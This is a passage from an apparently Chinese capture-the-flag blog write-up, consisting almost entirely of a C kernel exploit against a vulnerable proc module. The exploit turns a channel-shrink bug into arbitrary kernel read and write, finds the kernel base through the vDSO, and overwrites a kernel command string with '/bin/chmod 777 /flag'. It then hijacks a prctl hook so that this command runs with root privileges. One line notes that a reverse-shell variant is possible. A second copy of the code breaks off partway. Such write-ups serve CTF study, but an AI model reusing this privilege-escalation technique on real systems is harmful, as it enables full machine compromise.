class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(<span class="keyword">char</span> *)(addr + i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vdso:%lx\n&quot;</span>, addr);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> selinux_disable_addr = <span class="number">0x2C7BA0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prctl_hook = <span class="number">0x124FD00</span>;</span><br><span class="line"><span class="keyword">size_t</span> order_cmd = <span class="number">0x123D1E0</span>;</span><br><span class="line"><span class="keyword">size_t</span> poweroff_work_func_addr = <span class="number">0x9C4C0</span>;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> offset;</span><br><span class="line">offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>, offset);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/proc/simp1e&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line"><span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">&#123;</span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_base = addr - <span class="number">0x1020000</span>;</span><br><span class="line">prctl_hook += kernel_base;</span><br><span class="line">order_cmd += kernel_base;</span><br><span class="line">poweroff_work_func_addr += kernel_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found kernel base: %lx\n&quot;</span>, kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found prctl_hook: %lx\n&quot;</span>, prctl_hook);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found order_cmd : %lx\n&quot;</span>, order_cmd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found poweroff_work_func_addr: %lx\n&quot;</span>, poweroff_work_func_addr);</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;/bin/chmod 777 /flag\0&quot;</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf) + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd + <span class="number">20</span> - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = prctl_hook - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">20</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"></span><br><span class="line">prctl(addr, <span class="number">2</span>, addr, addr, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上程序的效果是修改权限，当然也是可以反弹shell的，不过需要再写一个程序并且上面的exp也需要修改一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span 